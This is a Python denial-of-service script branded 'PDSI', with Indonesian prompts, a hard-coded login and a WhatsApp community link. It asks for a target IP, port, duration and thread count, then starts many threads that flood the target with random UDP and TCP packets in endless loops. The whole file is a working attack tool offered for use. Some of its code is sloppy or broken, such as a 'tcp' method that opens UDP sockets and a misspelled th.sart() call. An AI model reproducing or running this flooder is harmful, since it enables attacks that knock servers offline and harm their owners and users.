#!/usr/bin/env python3
#By PDSI
#moga yg curl yapit
import os
import threading
import sys
import struct
import random
import time
import socket

os.system("clear")

username = str(input(" username >"))
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
password = str(input(" password >"))
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
print(" Waiting.")
time.sleep(1)
os.system("clear")
print(" Waiting..")
time.sleep(1)
os.system("clear")
print(" Waiting...")
time.sleep(1)
os.system("clear")
if password == "BEST PDSI" and username == "PDSI":
	print("Login")
	time.sleep(3)
else:
	print("Denied Password Wrong!")
	time.sleep(999999)
os.system("clear")

def  type(s):
        for c in s  +  '\n' :
              sys.stdout.write( c )
              sys.stdout.flush( )
              time.sleep(0.020)

print("""
		Authorized : @PDSI
		Scripting For DDoS Server
		Community : @PDSI
		WhastAaphttps: //chat.whatsapp.com/JGBjQu35crZ7eKNevwZn0k
		Methods > udp | tcp | ovh
	     """)

print("""
\033[91m
⠀⠀⠀⠠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣤⠤⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢈⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣅⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣷⣦⡀⠀⠀⠀
⢀⣴⣿⡷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣦⡀⠀
⣾⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷⠀
⣿⣿⣿⣧⠀⠀⠀⠘⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡇⠀⠀⠀⢀⣼⣿⣿⣿⣿⠀
⠹⣿⣿⣿⣷⣦⣄⡀⣿⣱⡀⠀⠀⠀⠀⠀⠀⢸⢿⣧⣠⣴⣾⣿⣿⣿⣿⡿⠃⠀
⠀⠈⠛⢷⣿⣟⡿⠿⠿⡟⣓⣒⣛⡛⡛⢟⣛⡛⠟⠿⣻⢿⣿⣻⡿⠛⠉⠀⠀⠀
⠀⠀⢠⣴⢻⡭⠖⡉⠥⣈⠀⣐⠂⡄⠔⢂⢦⡹⢬⡕⠊⠳⠈⢿⣳⡄⠀⠀⠀⠀
⠀⢀⣼⣷⣋⠲⢮⣁⠀⣐⠆⡤⢊⣜⡀⡾⣀⠀⢠⢻⣌⣤⣥⣓⣌⢻⣄⠀⠀⠀
⢰⣟⣽⢳⣯⣝⣦⡀⠓⡤⢆⠇⠂⠄⠤⡝⣂⠋⠖⢋⠀⣡⣶⣾⡿⡷⣽⡿⣄⠀
⢸⣿⡜⢯⣿⣿⣿⣷⣿⣤⣧⣶⣬⣝⣃⣓⣈⣥⣶⣿⣾⣿⣿⢣⠇⢻⡞⣯⣹⠆
⠀⢻⣼⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⡔⡯⢧⢟⣟⣱⠟⠀
⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⡼⡼⢁⡌⢼⡟⠁⠀⠀
⠀⠀⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢇⡼⢃⡿⣼⣛⡿⠀⠀⠀⠀
⠀⠀⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠟⣡⣫⣢⢏⣼⡵⠋⠀⠀⠀⠀⠀
⠀⢸⣿⣏⢿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⡾⢕⣻⣽⣵⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠘⢷⣮⣿⡼⢭⡟⠳⠞⡖⢛⣶⣷⣯⡶⠟⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠛⠛⠛⠿⠟⠛⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                   
██████╗░██████╗░░██████╗██╗ 
██╔══██╗██╔══██╗██╔════╝██║ 
██████╔╝██║░░██║╚█████╗░██║ 
██╔═══╝░██║░░██║░╚═══██╗██║ 
██║░░░░░██████╔╝██████╔╝██║ 
╚═╝░░░░░╚═════╝░╚═════╝░╚═╝ 

                          
                    TOOLS BY PDSI
                    PDSI NI GENKK. 
""")
type("Berikan Methods !!")
choice = str(input(" Methods ? "))
os.system("clear")
choice = str(input("\033[96m=====> Yakin? (y/n) : "))
type("Berikan Ip Server")
ip = str(input(" Hosting ?"))
os.system("clear")
type("Berikan Port Server")
port = int(input(" Port ? "))
os.system("clear")
print(" Waiting For Check Ip / Port")
time.sleep(3)
os.system("clear")
type("Berapa Lama Anda Untuk Menjalankan Mesin?")
times = int(input(" Times ? "))
os.system("clear")
type("Berapa Yang Anda Ingin Berikan?")
threads = int(input(" Attack ? "))

def udp():
	data = random._urandom(818)
	i = random.choice(("[+]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.connect((ip,port))
				s.sendto(data,addr)
			print(i +" PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			print(" Failed Command Please Check Your Command Back")
			
def tcp():
	data = random._urandom(65500)
	i = random.choice(("[+]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.connect((ip,port))
				s.sendto(data,addr)
			print(i +" You Have Sent")
		except:
			print(" Failed Command Please Check Your Command Back")
			
def ovh():
	data = random._urandom(999999)
	i = random.choice(("[+]","[?]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.connect((ip,port))
				s.sendto(data,addr)
			print(i +" You Have Sent")
		except:
			print(" Failed Command Please Check Your Command Back")

for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	if choice == 'tcp':		
		th = threading.Thread(target = tcp)
		th.start()
	if choice == 'ovh':
		th = threading.Thread(target = ovh)
		th.start()
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			print("[!] PDSI COMMUNITY DATANG MENYERANG !!!")
def run2():
	data = random._urandom(999)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			s.close()
			print("[*] PDSI COMMUNITY DATANG MENYERANG !!!")          
def run3():
	data = random._urandom(818)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			s.close()
			print("[*] PDSI COMMUNITY DATANG MENYERANG !!!")
def run4():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			s.close()
			print("[*] PDSI COMMUNITY DATANG MENYERANG !!!")      

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
else:
		th = threading.Thread(target = run4)
		th.start				
def udpsirisakz():
	data = random._urandom(1200)
	thr = int(0)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			s.sendto(data,addr)
			for x in range(1):
				s.sendto(data,addr)
				thr += 1
			print(f"| PDSI COMMUNITY DATANG MENYERANG !!! | {ip}:{port} Time: 120 >>", thr)
		except:
			thr -= 1			

for y in range(20):
		th = threading.Thread(target = udpsirisakz)
		th.start()
def tcpsirisakz():
	data = random._urandom(16)
	i = ("| PDSI COMMUNITY DATANG MENYERANG !!!| - ")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			s.close()
			print("PDSI COMMUNITY DATANG MENYERANG !!!")
			
for y in range(threads):
		th = threading.Thread(target = tcpsirisakz)
		th.sart()		
def lika():
	data = random._urandom(577)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			print("\033[91m [×] PDSI COMMUNITY DATANG MENYERAN!!!")			
def lika2():
	data = random._urandom(1025)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"\033[91m PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			s.close()
			print("\033[91m [×] PDSI COMMUNITY DATANG MENYEANG!!!")			
def lika3():
	data = random._urandom(65534)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			print("\033[91m [×] PDSI COMMUNITY DATANG MEYERANG!!!")			
def lika4():
	data = random._urandom(102400)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"\033[91m PDSI COMMUNITY DATANG MENYERANG !!!")
		except:
			print("\033[91m [×] PDSI COMMUNITY DATANG MENYERANG!!!")

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = lika)
		th.start()
		th = threading.Thread(target = lika2)
		th.start()
		th = threading.Thread(target = lika3)
		th.start()
	else:
		th = threading.Thread(target = lika4)
		th.start()
